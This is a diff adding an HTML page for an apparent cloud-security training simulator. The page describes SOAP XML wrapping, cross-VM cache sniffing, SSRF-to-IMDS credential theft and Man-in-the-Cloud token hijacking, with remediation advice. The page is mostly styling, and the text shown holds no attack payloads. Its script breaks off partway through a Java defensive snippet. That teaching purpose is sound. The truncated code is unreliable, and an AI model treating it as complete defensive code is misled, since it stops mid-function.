@@ -1,0 +1,2079 @@
+<!DOCTYPE html>
+<html lang="en" class="simulator-page">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Interactive Cloud Security Attack Vectors Simulator. Learn and test SOAP XML wrapping, Cross-VM side channels, SSRF-to-IMDS, and Man-in-the-Cloud vulnerabilities.">
+  <title>Antigravity Cloud | Threat Simulator Lab</title>
+  <link rel="stylesheet" href="styles.css">
+  
+  <style>
+    /* Premium Security Dashboard Variables & Styles */
+    :root {
+      --dark-bg: #090d16;
+      --dark-card: #111827;
+      --dark-border: #1f2937;
+      --dark-text: #f3f4f6;
+      --dark-muted: #9ca3af;
+      --sec-blue: #3b82f6;
+      --sec-green: #10b981;
+      --sec-orange: #f59e0b;
+      --sec-red: #ef4444;
+      --sec-glow-blue: rgba(59, 130, 246, 0.15);
+      --sec-glow-green: rgba(16, 185, 129, 0.15);
+      --sec-glow-red: rgba(239, 68, 68, 0.15);
+    }
+
+    /* Dark Mode override for the simulator page body and navbar */
+    body.simulator-body {
+      background-color: var(--dark-bg);
+      background-image: radial-gradient(circle at 50% 50%, #111a2e 0%, #090d16 100%);
+      color: var(--dark-text);
+    }
+
+    /* Dark Navbar */
+    .simulator-body header.navbar-container {
+      background: rgba(9, 13, 22, 0.85);
+      border-bottom: 1px solid var(--dark-border);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+    }
+    .simulator-body .logo span {
+      color: var(--dark-text);
+    }
+    .simulator-body .logo {
+      color: var(--sec-blue);
+    }
+    .simulator-body .nav-links a {
+      color: var(--dark-muted);
+    }
+    .simulator-body .nav-links a:hover,
+    .simulator-body .nav-links a.active {
+      color: var(--dark-text);
+    }
+    .simulator-body .nav-links a.active {
+      color: var(--sec-blue);
+    }
+
+    /* Simulator Layout */
+    .sim-wrapper {
+      display: grid;
+      grid-template-columns: 280px 1fr;
+      min-height: calc(100vh - var(--header-height));
+      gap: 1.5rem;
+      padding-block: 1.5rem;
+    }
+
+    /* Sidebar Navigation */
+    .sim-sidebar {
+      background: var(--dark-card);
+      border: 1px solid var(--dark-border);
+      border-radius: var(--radius-md);
+      padding: 1.25rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+      height: fit-content;
+      position: sticky;
+      top: calc(var(--header-height) + 1.5rem);
+    }
+
+    .sim-sidebar-title {
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: var(--dark-muted);
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      margin-bottom: 0.5rem;
+      padding-left: 0.5rem;
+    }
+
+    .sim-nav-btn {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      padding: 0.75rem 1rem;
+      background: transparent;
+      border: 1px solid transparent;
+      border-radius: var(--radius-sm);
+      color: var(--dark-muted);
+      font-weight: 600;
+      font-size: 0.9rem;
+      text-align: left;
+      cursor: pointer;
+      transition: all var(--transition-fast);
+      width: 100%;
+    }
+
+    .sim-nav-btn:hover {
+      background: rgba(255, 255, 255, 0.03);
+      color: var(--dark-text);
+    }
+
+    .sim-nav-btn.active {
+      background: var(--sec-glow-blue);
+      border-color: rgba(59, 130, 246, 0.3);
+      color: var(--sec-blue);
+    }
+
+    /* Main Simulator Dashboard */
+    .sim-main {
+      display: flex;
+      flex-direction: column;
+      gap: 1.5rem;
+    }
+
+    /* Info Banner */
+    .sim-header-card {
+      background: var(--dark-card);
+      border: 1px solid var(--dark-border);
+      border-radius: var(--radius-md);
+      padding: 1.5rem;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .sim-header-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 4px;
+      height: 100%;
+      background: var(--sec-blue);
+    }
+
+    .sim-header-card.soap-active::before { background: var(--sec-orange); }
+    .sim-header-card.cross-active::before { background: var(--sec-red); }
+    .sim-header-card.ssrf-active::before { background: var(--sec-blue); }
+    .sim-header-card.mitc-active::before { background: #8b5cf6; }
+    .sim-header-card.vm-active::before { background: var(--sec-green); }
+
+    .sim-meta {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .sim-badge {
+      font-size: 0.75rem;
+      font-weight: 700;
+      padding: 0.2rem 0.6rem;
+      border-radius: 9999px;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .sim-badge.high {
+      background: rgba(245, 158, 11, 0.15);
+      color: var(--sec-orange);
+      border: 1px solid rgba(245, 158, 11, 0.3);
+    }
+
+    .sim-badge.critical {
+      background: rgba(239, 68, 68, 0.15);
+      color: var(--sec-red);
+      border: 1px solid rgba(239, 68, 68, 0.3);
+    }
+
+    .sim-badge.info-badge {
+      background: rgba(16, 185, 129, 0.15);
+      color: var(--sec-green);
+      border: 1px solid rgba(16, 185, 129, 0.3);
+    }
+
+    .sim-badge.affected {
+      background: rgba(255, 255, 255, 0.05);
+      color: var(--dark-muted);
+      border: 1px solid var(--dark-border);
+    }
+
+    .sim-title {
+      font-size: 1.75rem;
+      color: var(--dark-text);
+      margin-bottom: 0.5rem;
+    }
+
+    .sim-desc {
+      color: var(--dark-muted);
+      font-size: 0.95rem;
+      max-width: 800px;
+    }
+
+    /* Simulator Layout Panels */
+    .sim-grid {
+      display: grid;
+      grid-template-columns: 1.2fr 0.8fr;
+      gap: 1.5rem;
+      align-items: start;
+    }
+
+    @media (max-width: 1024px) {
+      .sim-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .sim-panel {
+      background: var(--dark-card);
+      border: 1px solid var(--dark-border);
+      border-radius: var(--radius-md);
+      padding: 1.5rem;
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+      min-height: 500px;
+    }
+
+    .sim-panel-title {
+      font-size: 1.1rem;
+      color: var(--dark-text);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid var(--dark-border);
+      padding-bottom: 0.75rem;
+    }
+
+    /* Remediation Sidebar */
+    .remediation-panel {
+      background: var(--dark-card);
+      border: 1px solid var(--dark-border);
+      border-radius: var(--radius-md);
+      padding: 1.5rem;
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+    }
+
+    .remediation-toggle-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: rgba(255, 255, 255, 0.02);
+      border: 1px solid var(--dark-border);
+      padding: 0.75rem 1rem;
+      border-radius: var(--radius-sm);
+    }
+
+    .remediation-label {
+      font-weight: 600;
+      font-size: 0.95rem;
+      color: var(--dark-text);
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    /* Custom Switch Toggle */
+    .switch {
+      position: relative;
+      display: inline-block;
+      width: 46px;
+      height: 24px;
+    }
+
+    .switch input {
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+
+    .slider {
+      position: absolute;
+      cursor: pointer;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: #374151;
+      transition: .3s;
+      border-radius: 24px;
+    }
+
+    .slider:before {
+      position: absolute;
+      content: "";
+      height: 16px;
+      width: 16px;
+      left: 4px;
+      bottom: 4px;
+      background-color: white;
+      transition: .3s;
+      border-radius: 50%;
+    }
+
+    input:checked + .slider {
+      background-color: var(--sec-green);
+      box-shadow: 0 0 8px rgba(16, 185, 129, 0.5);
+    }
+
+    input:checked + .slider:before {
+      transform: translateX(22px);
+    }
+
+    .remediation-status {
+      font-size: 0.85rem;
+      padding: 0.5rem;
+      border-radius: var(--radius-sm);
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-weight: 500;
+    }
+
+    .remediation-status.disabled {
+      background: rgba(239, 68, 68, 0.05);
+      color: var(--sec-red);
+      border: 1px solid rgba(239, 68, 68, 0.15);
+    }
+
+    .remediation-status.enabled {
+      background: rgba(16, 185, 129, 0.05);
+      color: var(--sec-green);
+      border: 1px solid rgba(16, 185, 129, 0.15);
+    }
+
+    /* Code Tabs & Block */
+    .code-tabs {
+      display: flex;
+      border-bottom: 1px solid var(--dark-border);
+      gap: 0.5rem;
+    }
+
+    .code-tab-btn {
+      background: transparent;
+      border: none;
+      color: var(--dark-muted);
+      padding: 0.5rem 0.75rem;
+      font-size: 0.85rem;
+      font-weight: 600;
+      cursor: pointer;
+      border-bottom: 2px solid transparent;
+      transition: all var(--transition-fast);
+    }
+
+    .code-tab-btn.active {
+      color: var(--sec-blue);
+      border-bottom-color: var(--sec-blue);
+    }
+
+    .code-display {
+      background: #060910;
+      border: 1px solid var(--dark-border);
+      border-radius: var(--radius-sm);
+      padding: 1rem;
+      font-family: var(--font-mono);
+      font-size: 0.825rem;
+      color: #93c5fd; /* Light blue text */
+      overflow-x: auto;
+      white-space: pre;
+      margin: 0;
+      max-height: 250px;
+    }
+
+    /* Terminal Simulator Console */
+    .sim-console {
+      background: #030712;
+      border: 1px solid var(--dark-border);
+      border-radius: var(--radius-sm);
+      padding: 0.75rem;
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      color: #10b981;
+      height: 140px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 0.35rem;
+      box-shadow: inset 0 0 10px rgba(0,0,0,0.8);
+    }
+
+    .console-line {
+      display: flex;
+      gap: 0.5rem;
+    }
+
+    .console-line .prompt {
+      color: #3b82f6;
+      user-select: none;
+    }
+
+    .console-line.error { color: var(--sec-red); }
+    .console-line.success { color: var(--sec-green); }
+    .console-line.warning { color: var(--sec-orange); }
+    .console-line.info { color: #60a5fa; }
+
+    /* Interactive Component specific styles */
+
+    /* 1. SOAP Wrapping Playground */
+    .soap-split {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+      flex-grow: 1;
+    }
+
+    .soap-payload-box {
+      border: 1px solid var(--dark-border);
+      border-radius: var(--radius-sm);
+      background: #070b13;
+      padding: 0.75rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+    }
+
+    .soap-title {
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: var(--dark-muted);
+      border-bottom: 1px solid var(--dark-border);
+      padding-bottom: 0.25rem;
+    }
+
+    .xml-content {
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      line-height: 1.4;
+      white-space: pre-wrap;
+      color: #94a3b8;
+      overflow-y: auto;
+      flex-grow: 1;
+      max-height: 220px;
+    }
+
+    .xml-hl-signed {
+      background: rgba(16, 185, 129, 0.15);
+      border: 1px dashed rgba(16, 185, 129, 0.4);
+      color: #34d399;
+      padding-inline: 2px;
+      border-radius: 2px;
+    }
+
+    .xml-hl-attacker {
+      background: rgba(239, 68, 68, 0.15);
+      border: 1px dashed rgba(239, 68, 68, 0.4);
+      color: #f87171;
+      padding-inline: 2px;
+      border-radius: 2px;
+    }
+
+    /* 2. Cross-VM Side Channel Grid */
+    .cache-container {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+      align-items: center;
+      flex-grow: 1;
+      justify-content: center;
+    }
+
+    .cache-grid {
+      display: grid;
+      grid-template-columns: repeat(8, 1fr);
+      gap: 0.5rem;
+      width: 100%;
+      max-width: 480px;
+    }
+
+    .cache-line {
+      aspect-ratio: 1;
+      border: 1px solid var(--dark-border);
+      border-radius: var(--radius-sm);
+      background: rgba(31, 41, 55, 0.4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      font-weight: 700;
+      color: var(--dark-muted);
+      transition: all 0.3s ease;
+      position: relative;
+    }
+
+    .cache-line.primed {
+      background: rgba(59, 130, 246, 0.25);
+      border-color: rgba(59, 130, 246, 0.6);
+      color: #60a5fa;
+      box-shadow: 0 0 10px rgba(59, 130, 246, 0.2);
+    }
+
+    .cache-line.victim {
+      background: rgba(139, 92, 246, 0.3);
+      border-color: rgba(139, 92, 246, 0.6);
+      color: #a78bfa;
+      box-shadow: 0 0 10px rgba(139, 92, 246, 0.25);
+    }
+
+    .cache-line.miss {
+      background: rgba(245, 158, 11, 0.25);
+      border-color: rgba(245, 158, 11, 0.6);
+      color: #fbbf24;
+      box-shadow: 0 0 10px rgba(245, 158, 11, 0.2);
+    }
+
+    .cache-line.hit {
+      background: rgba(16, 185, 129, 0.25);
+      border-color: rgba(16, 185, 129, 0.6);
+      color: #34d399;
+      box-shadow: 0 0 10px rgba(16, 185, 129, 0.15);
+    }
+
+    .cache-legend {
+      display: flex;
+      gap: 1rem;
+      font-size: 0.8rem;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+
+    .legend-item {
+      display: flex;
+      align-items: center;
+      gap: 0.35rem;
+      color: var(--dark-muted);
+    }
+
+    .legend-box {
+      width: 14px;
+      height: 14px;
+      border-radius: 3px;
+      border: 1px solid var(--dark-border);
+    }
+
+    /* 3. SSRF visual pathway */
+    .network-container {
+      display: flex;
+      flex-direction: column;
+      gap: 1.5rem;
+      flex-grow: 1;
+      justify-content: center;
+      position: relative;
+    }
+
+    .network-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      position: relative;
+      padding-inline: 1rem;
+    }
+
+    .net-node {
+      width: 80px;
+      height: 80px;
+      border: 1px solid var(--dark-border);
+      border-radius: var(--radius-md);
+      background: var(--dark-card);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.75rem;
+      font-weight: 700;
+      color: var(--dark-text);
+      gap: 0.35rem;
+      z-index: 2;
+      box-shadow: var(--shadow-md);
+      transition: all 0.3s ease;
+    }
+
+    .net-node svg {
+      width: 24px;
+      height: 24px;
+      color: var(--dark-muted);
+      transition: color 0.3s ease;
+    }
+
+    .net-node.active {
+      border-color: var(--sec-blue);
+      box-shadow: 0 0 15px var(--sec-glow-blue);
+    }
+    .net-node.active svg { color: var(--sec-blue); }
+
+    .net-node.vulnerable {
+      border-color: var(--sec-red);
+      box-shadow: 0 0 15px var(--sec-glow-red);
+    }
+    .net-node.vulnerable svg { color: var(--sec-red); }
+
+    .net-node.secure {
+      border-color: var(--sec-green);
+      box-shadow: 0 0 15px var(--sec-glow-green);
+    }
+    .net-node.secure svg { color: var(--sec-green); }
+
+    .net-wire {
+      position: absolute;
+      top: 40px;
+      left: 80px;
+      right: 80px;
+      height: 2px;
+      background: var(--dark-border);
+      z-index: 1;
+    }
+
+    .net-wire-active {
+      position: absolute;
+      top: 40px;
+      left: 80px;
+      width: 0%;
+      height: 2px;
+      background: var(--sec-blue);
+      z-index: 1;
+      transition: width 0.8s linear;
+    }
+
+    .net-wire-active.error-wire {
+      background: var(--sec-red);
+    }
+
+    .net-wire-active.success-wire {
+      background: var(--sec-green);
+    }
+
+    .net-packet {
+      position: absolute;
+      top: 36px;
+      left: 80px;
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: var(--sec-blue);
+      display: none;
+      z-index: 3;
+      box-shadow: 0 0 8px var(--sec-blue);
+    }
+
+    .ssrf-input-container {
+      display: flex;
+      gap: 0.5rem;
+      border: 1px solid var(--dark-border);
+      background: rgba(0,0,0,0.2);
+      padding: 0.35rem;
+      border-radius: var(--radius-sm);
+    }
+
+    .ssrf-url-input {
+      flex-grow: 1;
+      background: transparent;
+      border: none;
+      color: var(--dark-text);
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      padding-inline: 0.5rem;
+    }
+    .ssrf-url-input:focus { outline: none; }
+
+    /* 4. Man-in-the-Cloud visual flow */
+    .mitc-container {
+      display: flex;
+      flex-direction: column;
+      gap: 1.5rem;
+      flex-grow: 1;
+      justify-content: center;
+      position: relative;
+    }
+
+    .mitc-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 1rem;
+      align-items: center;
+      position: relative;
+    }
+
+    .mitc-entity {
+      border: 1px solid var(--dark-border);
+      border-radius: var(--radius-md);
+      background: var(--dark-card);
+      padding: 0.75rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0.5rem;
+      text-align: center;
+      font-size: 0.8rem;
+      position: relative;
+      box-shadow: var(--shadow-sm);
+      transition: all 0.3s ease;
+    }
+
+    .mitc-entity.highlight {
+      border-color: var(--sec-blue);
+      box-shadow: 0 0 10px var(--sec-glow-blue);
+    }
+    .mitc-entity.alert {
+      border-color: var(--sec-red);
+      box-shadow: 0 0 10px var(--sec-glow-red);
+    }
+
+    .token-pill {
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      background: var(--sec-glow-blue);
+      color: var(--sec-blue);
+      border: 1px solid rgba(59, 130, 246, 0.3);
+      padding: 0.15rem 0.4rem;
+      border-radius: 4px;
+      margin-top: 0.25rem;
+      display: inline-block;
+      transition: all 0.3s ease;
+    }
+
+    .token-pill.compromised {
+      background: var(--sec-glow-red);
+      color: var(--sec-red);
+      border-color: rgba(239, 68, 68, 0.3);
+      animation: pulse 1s infinite alternate;
+    }
+
+    /* 5. VM Isolation Simulator */
+    .vm-playground {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+      width: 100%;
+      flex-grow: 1;
+      justify-content: center;
+    }
+
+    .vm-mode-selector {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: rgba(255, 255, 255, 0.02);
+      border: 1px solid var(--dark-border);
+      padding: 0.5rem 1rem;
+      border-radius: var(--radius-sm);
+    }
+
+    .vm-mode-btn {
+      background: transparent;
+      border: 1px solid var(--dark-border);
+      color: var(--dark-muted);
+      padding: 0.35rem 0.75rem;
+      font-size: 0.8rem;
+      font-weight: 600;
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      transition: all var(--transition-fast);
+    }
+
+    .vm-mode-btn.active {
+      background: var(--sec-glow-blue);
+      border-color: var(--sec-blue);
+      color: var(--sec-blue);
+      box-shadow: 0 0 8px var(--sec-glow-blue);
+    }
+
+    .vm-hardware-layout {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+    }
+
+    @media (max-width: 640px) {
+      .vm-hardware-layout {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .vm-hardware-box {
+      border: 1px solid var(--dark-border);
+      border-radius: var(--radius-sm);
+      background: #070b13;
+      padding: 0.75rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+    }
+
+    .vm-socket-card {
+      background: rgba(255,255,255,0.02);
+      border: 1px solid var(--dark-border);
+      border-radius: var(--radius-sm);
+      padding: 0.6rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+      transition: border-color 0.3s ease;
+    }
+
+    .vm-core-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 0.5rem;
+    }
+
+    .vm-core-slot {
+      border: 1px dashed var(--dark-border);
+      padding: 0.6rem;
+      font-size: 0.75rem;
+      border-radius: 4px;
+      text-align: center;
+      color: var(--dark-muted);
+      transition: all 0.3s ease;
+      font-family: var(--font-mono);
+    }
+
+    .vm-core-slot.corp-vm {
+      background: rgba(59, 130, 246, 0.15);
+      border-color: rgba(59, 130, 246, 0.5);
+      color: #60a5fa;
+      border-style: solid;
+      box-shadow: 0 0 8px rgba(59, 130, 246, 0.1);
+    }
+
+    .vm-core-slot.attacker-vm {
+      background: rgba(239, 68, 68, 0.15);
+      border-color: rgba(239, 68, 68, 0.5);
+      color: #f87171;
+      border-style: solid;
+      box-shadow: 0 0 8px rgba(239, 68, 68, 0.1);
+    }
+
+    @keyframes pulse {
+      from { transform: scale(1); opacity: 0.8; }
+      to { transform: scale(1.05); opacity: 1; }
+    }
+
+    /* Global Lab Controls */
+    .lab-controls {
+      display: flex;
+      gap: 0.75rem;
+      flex-wrap: wrap;
+    }
+
+    /* Threat Status banner */
+    .threat-status-banner {
+      background: rgba(255, 255, 255, 0.02);
+      border: 1px solid var(--dark-border);
+      padding: 0.75rem 1rem;
+      border-radius: var(--radius-sm);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .threat-indicator {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-weight: 700;
+      font-size: 0.9rem;
+    }
+
+    .threat-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: var(--sec-green);
+    }
+    .threat-dot.vuln {
+      background: var(--sec-red);
+      box-shadow: 0 0 8px var(--sec-red);
+    }
+    .threat-dot.secure {
+      background: var(--sec-green);
+      box-shadow: 0 0 8px var(--sec-green);
+    }
+  </style>
+</head>
+<body class="simulator-body">
+
+  <!-- Navigation Header -->
+  <header class="navbar-container">
+    <div class="container">
+      <a href="index.html" class="logo">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" style="margin-right: 0.25rem;">
+          <rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/>
+        </svg>
+        <span>Antigravity Cloud</span>
+      </a>
+      <nav aria-label="Main Navigation">
+        <ul class="nav-links">
+          <li><a href="index.html">Home</a></li>
+          <li><a href="features.html">Features</a></li>
+          <li><a href="simulator.html" class="active">Simulator</a></li>
+          <li><a href="contact.html">Contact</a></li>
+          <li><a href="contact.html" class="btn btn-primary" style="padding: 0.45rem 1rem; font-size: 0.85rem;">Get Started</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="container">
+    <div class="sim-wrapper">
+      
+      <!-- Left Sidebar Nav -->
+      <aside class="sim-sidebar">
+        <div class="sim-sidebar-title">Attack Categories</div>
+        
+        <button type="button" class="sim-nav-btn active" data-target="soap-xml">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+          SOAP XML Wrapping
+        </button>
+
+        <button type="button" class="sim-nav-btn" data-target="cross-vm">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
+          Cross-VM Cache Sniff
+        </button>
+
+        <button type="button" class="sim-nav-btn" data-target="ssrf-imds">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+          SSRF-to-IMDS Creds
+        </button>
+
+        <button type="button" class="sim-nav-btn" data-target="mitc">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          MitC Token Hijack
+        </button>
+
+        <button type="button" class="sim-nav-btn" data-target="vm-isolation">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 20h20M5 17V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2v12"/></svg>
+          VM & Private Cloud Lab
+        </button>
+      </aside>
+
+      <!-- Main Dashboard Container -->
+      <section class="sim-main" aria-label="Interactive Threat Lab Panel">
+        
+        <!-- Header Info Card -->
+        <div id="sim-header" class="sim-header-card soap-active">
+          <div class="sim-meta">
+            <span id="sim-badge" class="sim-badge high">High Severity</span>
+            <span id="sim-protocol" class="sim-badge affected">Protocol: WS-Security / SOAP XML</span>
+          </div>
+          <h1 id="sim-title" class="sim-title">SOAP XML Wrapping Attack</h1>
+          <p id="sim-desc" class="sim-desc">Exploits logic flaws in web services where the signature checking engine verifies one element (using its ID tag reference) but the business application processes a duplicate unsigned element located elsewhere in the message body.</p>
+        </div>
+
+        <!-- Two Panel Simulation Grid -->
+        <div class="sim-grid">
+          
+          <!-- Left Panel: Interactive Simulation Lab -->
+          <div class="sim-panel">
+            <div class="sim-panel-title">
+              <span>Interactive Laboratory</span>
+              <span id="lab-step-indicator" style="font-size: 0.85rem; font-weight: 500; color: var(--dark-muted);">Step: Ready</span>
+            </div>
+
+            <!-- Dynamic Simulator Content Containers -->
+            <div id="sim-playground-container" style="flex-grow: 1; display: flex; flex-direction: column;">
+              <!-- Container elements will be dynamically updated by JS -->
+            </div>
+
+            <!-- Console Log Panel -->
+            <div class="sim-console" id="sim-console" aria-label="Simulator Logs">
+              <div class="console-line info"><span class="prompt">&gt;</span><span>System initialized. Select steps below to run simulation.</span></div>
+            </div>
+
+            <!-- Simulation Controls -->
+            <div class="lab-controls" id="sim-controls">
+              <!-- Dynamically populated buttons -->
+            </div>
+          </div>
+
+          <!-- Right Panel: Technical Analysis & Remediation -->
+          <div class="sim-panel-side" style="display: flex; flex-direction: column; gap: 1.5rem;">
+            
+            <!-- Threat Status & Toggle -->
+            <div class="remediation-panel">
+              <div class="threat-status-banner">
+                <span style="font-size: 0.85rem; color: var(--dark-muted); font-weight: 600;">Status</span>
+                <div class="threat-indicator" id="threat-indicator-block">
+                  <div class="threat-dot vuln" id="threat-dot"></div>
+                  <span id="threat-status-text">SYSTEM VULNERABLE</span>
+                </div>
+              </div>
+
+              <div class="remediation-toggle-container">
+                <div class="remediation-label">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--sec-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                  Apply Remediation
+                </div>
+                <label class="switch" aria-label="Toggle remediation protection">
+                  <input type="checkbox" id="remediation-toggle">
+                  <span class="slider"></span>
+                </label>
+              </div>
+            </div>
+
+            <!-- Remediation Guide & Code Blocks -->
+            <div class="remediation-panel" style="flex-grow: 1;">
+              <h3 style="font-size: 1.05rem; border-bottom: 1px solid var(--dark-border); padding-bottom: 0.5rem;">Remediation Guide</h3>
+              <p id="remediation-text" style="font-size: 0.85rem; color: var(--dark-muted); line-height: 1.5;">Configure absolute XPath mapping filters or enforce a strict XSD schema that validates the document layout, preventing attackers from injecting duplicate element wrappers.</p>
+              
+              <div class="code-tabs" role="tablist">
+                <button type="button" class="code-tab-btn active" id="btn-tab-1" role="tab" aria-selected="true">Defense Code</button>
+                <button type="button" class="code-tab-btn" id="btn-tab-2" role="tab" aria-selected="false">Attack Vector</button>
+              </div>
+              <pre class="code-display" id="code-block-display" aria-label="Reference code representation">Select an attack to view remediation code.</pre>
+            </div>
+
+          </div>
+
+        </div>
+
+      </section>
+
+    </div>
+  </main>
+
+  <!-- Footer Section -->
+  <footer class="site-footer" style="background: #090d16; border-top: 1px solid var(--dark-border); margin-top: 3rem;">
+    <div class="container">
+      <div class="footer-grid">
+        <div class="footer-col">
+          <div class="logo" style="font-size: 1.15rem; color: var(--sec-blue);">
+            <span>Antigravity Cloud</span>
+          </div>
+          <p style="font-size: 0.85rem; color: var(--dark-muted);">Professional static and dynamic hosting services for business infrastructure.</p>
+        </div>
+        <div class="footer-col">
+          <h4>Platform</h4>
+          <ul>
+            <li><a href="features.html" style="color: var(--dark-muted);">Features</a></li>
+            <li><a href="simulator.html" style="color: var(--dark-text); font-weight: 600;">Attack Simulator</a></li>
+            <li><a href="index.html#pricing-heading" style="color: var(--dark-muted);">Pricing</a></li>
+            <li><a href="contact.html" style="color: var(--dark-muted);">Security Policies</a></li>
+          </ul>
+        </div>
+        <div class="footer-col">
+          <h4>Company</h4>
+          <ul>
+            <li><a href="contact.html" style="color: var(--dark-muted);">About Us</a></li>
+            <li><a href="contact.html" style="color: var(--dark-muted);">Support</a></li>
+            <li><a href="contact.html" style="color: var(--dark-muted);">Privacy Terms</a></li>
+          </ul>
+        </div>
+      </div>
+      <div class="footer-bottom" style="border-top: 1px solid var(--dark-border); padding-top: 1rem; margin-top: 1.5rem;">
+        <p style="color: var(--dark-muted);">&copy; 2026 Antigravity Cloud Inc. All rights reserved.</p>
+        <p style="color: var(--dark-muted);">Built for AWS EC2 Deployment</p>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Simulation JavaScript Logic -->
+  <script>
+    // ----------------------------------------------------
+    // CONSTANTS & SIMULATOR DATABASE
+    // ----------------------------------------------------
+    const ATTACK_VECTORS = {
+      'soap-xml': {
+        title: 'SOAP XML Wrapping Attack',
+        desc: 'Exploits logic flaws in web services where the signature checking engine verifies one element (using its ID tag reference) but the business application processes a duplicate unsigned element located elsewhere in the message body.',
+        severity: 'High Severity',
+        severityClass: 'high',
+        protocol: 'Protocol: WS-Security / SOAP XML',
+        remediation: 'Configure absolute XPath mapping filters or enforce a strict XSD schema that validates the document layout, preventing attackers from injecting duplicate element wrappers.',
+        codeDefense: `// Strict validation binding signature element to body query
+public void processMessage(SOAPMessage msg) throws Exception {
+    SOAPPart sp = msg.getSOAPPart();
+    SOAPEnvelope env = sp.getEnvelope();
+    
+    // Explicit absolute XPath querying instead of flexible ID lookup
+    XPath xPath = XPathFactory.newInstance().newXPath();
+    xPath.setNamespaceContext(new SOAPNamespaceContext());
+    
+    // Only execute the body block physically covered by WS-Signature
+    Node signedBody = (Node) xPath.evaluate(
+        "/soapenv:Envelope/soapenv:Body[@wsu:Id='Original']",
+        env, XPathConstants.NODE
+    );
+    
